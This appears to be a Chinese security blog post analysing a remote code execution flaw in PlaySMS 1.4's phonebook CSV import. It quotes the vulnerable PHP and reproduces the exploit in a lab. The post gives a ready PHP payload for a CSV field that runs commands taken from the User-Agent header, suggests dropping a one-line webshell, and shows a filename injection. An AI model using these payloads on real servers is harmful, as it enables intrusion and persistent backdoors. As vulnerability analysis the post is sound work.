---
title: PlaySms 1.4代码执行漏洞之import csv
date: 2017-05-15 20:19:11
categories: exploit
tags:
	- web
	- php
---
PlaySms是一个灵活的基于Web的短信平台，可连接短信网关、个人信息系统以及企业的群组通讯工具等。本次爆出的漏洞是1.4版本的另一个代码执行漏洞，该漏洞在exploit-db上有所收录，详情可参考https://www.exploit-db.com/exploits/42044/。

<!--more-->

# PlaySms 1.4代码执行漏洞之import csv
## 官方文案描述
- Exploit标题：PlaySMS 1.4 利用Phonebook import功能(import.php)完成远程代码执行
- Date: 22-05-2017
- 软件链接：Software Link: https://playsms.org/download/
- 版本: 1.4
- Exploit作者：Touhid M.Shaikh
- 联系: http://twitter.com/touhidshaikh22
- 网站: http://touhidshaikh.com/
- 类别：webapps

1. 描述
- 利用import.php完成代码执行
  - 我们知道import.php接受文件并读取内容，它并不会保存到服务器上。但是我们可以将payload保存到backdoor.csv中并上传到phonebook。他会执行我们的代码并显示在返回的页面中（NAME,MOBILE,EMail,Group code,Tags）。
  - 在我的例子中，我保存了漏洞代码在Name backdoor.csv的Name字段。
  - 但仍然有有一个问题。它仅仅执行内置的应用所使用的那些函数和变量。
  - 这就是服务器为什么不直接执行payload的原因。我在name字段使用"<?php $a=$_SERVER['HTTP_USER_AGENT']; system($a); ?>"，修改user agent为任意命令，你就可以执行其命令。因为它不会直接执行<?php system("id")?> 。

使用的backdoor.csv的文件内容：
----------------------MY FILE CONTENT------------------------------------
Name                                                Mobile  Email   Group code  Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>  22         

--------------------MY FILE CONTENT END HERE-------------------------------

2. POC
  作为一般用户登录（在index.php?app=main&inc=core_auth&route=register创建用户）：

去：http://127.0.0.1/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list

form如下：
```php
----------------------Form for upload CSV file ----------------------
<form action=\"index.php?app=main&inc=feature_phonebook&route=import&op=import\" enctype=\"multipart/form-data\" method=POST>
" . _CSRF_FORM_ . "
<p>" . _('Please select CSV file for phonebook entries') . "</p>
<p><input type=\"file\" name=\"fnpb\"></p>
<p class=text-info>" . _('CSV file format') . " : " . _('Name') . ", " . _('Mobile') . ", " . _('Email') . ", " . _('Group code') . ", " . _('Tags') . "</p>
<p><input type=\"submit\" value=\"" . _('Import') . "\" class=\"button\"></p>
</form>


-------------Read Content and Display Content-----------------------
  
   case "import":
        $fnpb = $_FILES['fnpb'];
        $fnpb_tmpname = $_FILES['fnpb']['tmp_name'];
        $content = "
            <h2>" . _('Phonebook') . "</h2>
            <h3>" . _('Import confirmation') . "</h3>
            <div class=table-responsive>
            <table class=playsms-table-list>
            <thead><tr>
                <th width=\"5%\">*</th>
                <th width=\"20%\">" . _('Name') . "</th>
                <th width=\"20%\">" . _('Mobile') . "</th>
                <th width=\"25%\">" . _('Email') . "</th>
                <th width=\"15%\">" . _('Group code') . "</th>
                <th width=\"15%\">" . _('Tags') . "</th>
            </tr></thead><tbody>";
        if (file_exists($fnpb_tmpname)) {
            $session_import = 'phonebook_' . _PID_;
            unset($_SESSION['tmp'][$session_import]);
            ini_set('auto_detect_line_endings', TRUE);
            if (($fp = fopen($fnpb_tmpname, "r")) !== FALSE) {
                $i = 0;
                while ($c_contact = fgetcsv($fp, 1000, ',', '"', '\\')) {
                    if ($i > $phonebook_row_limit) {
                        break;
                    }
                    if ($i > 0) {
                        $contacts[$i] = $c_contact;
                    }
                    $i++;
                }
                $i = 0;
                foreach ($contacts as $contact) {
                    $c_gid = phonebook_groupcode2id($uid, $contact[3]);
                    if (!$c_gid) {
                        $contact[3] = '';
                    }
                    $contact[1] = sendsms_getvalidnumber($contact[1]);
                    $contact[4] = phonebook_tags_clean($contact[4]);
                    if ($contact[0] && $contact[1]) {
                        $i++;
                        $content .= "
                            <tr>
                            <td>$i.</td>
                            <td>$contact[0]</td>
                            <td>$contact[1]</td>
                            <td>$contact[2]</td>
                            <td>$contact[3]</td>
                            <td>$contact[4]</td>
                            </tr>";
                        $k = $i - 1;
                        $_SESSION['tmp'][$session_import][$k] = $contact;
                    }
                }
  
------------------------------code ends ---------------------------
```

## 搭建环境测试
exploit-db给的信息依然充足，提供了Exploit的下载，以及包含该漏洞的App。这一漏洞和该作者爆出的前一个漏洞很像，都是十分简单的漏洞，只是出问题的功能（feature）不同。我们依然搭建环境复现一下，再进行进一步的分析与说明。

关于软件环境的搭建以及此前爆出的代码执行漏洞说明，请参考另一篇博客
https://cloudker.github.io/web-security/2017/05/15/PlaySms-1.4%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90

在"MyAccount"菜单下找到"phonebook"，这里允许导入csv格式的文件。

![](/images/exploit/playSms/20170522_1.png)

点击一行小图标的第二个按钮，这就是导入功能:

![](/images/exploit/playSms/20170522_2.png)

依然翻一下页面源码，确定其action提交位置，参数等。

![](/images/exploit/playSms/20170522_3.png)

和上一次遇到的form几乎完全相同。

通过对代码逻辑的跟踪，最终定位到playsms/plugin/feature/phonebook/import.php中：

![](/images/exploit/playSms/20170522_4.png)

可以看到在对case 'import'的处理时，是简单的读出其内容，并填充到定制的表格中，而$content中的表格项又是老问题，直接引用了$contact[i]而没有做任何的过滤，这就导致了代码执行的漏洞。虽然csv文件仅仅仅仅只是在内存中读取，不会保存到服务器，看起来“防止”了后门，然而，命令执行漏洞一旦爆出，后门真的就没有办法制作吗？That's so easy， 简单的echo一句话木马到某个文件中即可。

这里，我们仅仅看一下效果，因为对其使用的csv格式不了解是否有自定义，所以可以先手动增加几个条目，导出到一个csv文件，再改写。

![](/images/exploit/playSms/20170522_5.png)

上传后，执行效果如下：

![](/images/exploit/playSms/20170522_6.png)

当然，其他的几个field也是可以执行的。

## 一点引申的思考
Playsms代码较少，从代码编写中也可以看出其并不成熟，虽然行里行外都能嗅到很多安全的防护代码，但是往往最基本的也是最容易漏掉的问题一个接一个的爆出。这种漏洞是但是对于程序员来说又是极容易忽略的。我们很多时候习惯了Windows系统，认为文件名不能够包含‘<’等特殊字符，但实际上，且不说Linux允许`<?php system('uname -a');die();?>.php`这样的名字，就算都不允许，也可以通过抓包改包的方式（比如fiddler，burpsuite等一干好用的http proxy工具）改掉。从设计的角度来看，对于服务器的程序，要尽量少依赖其他模块的安全，本身做好检查与过滤。
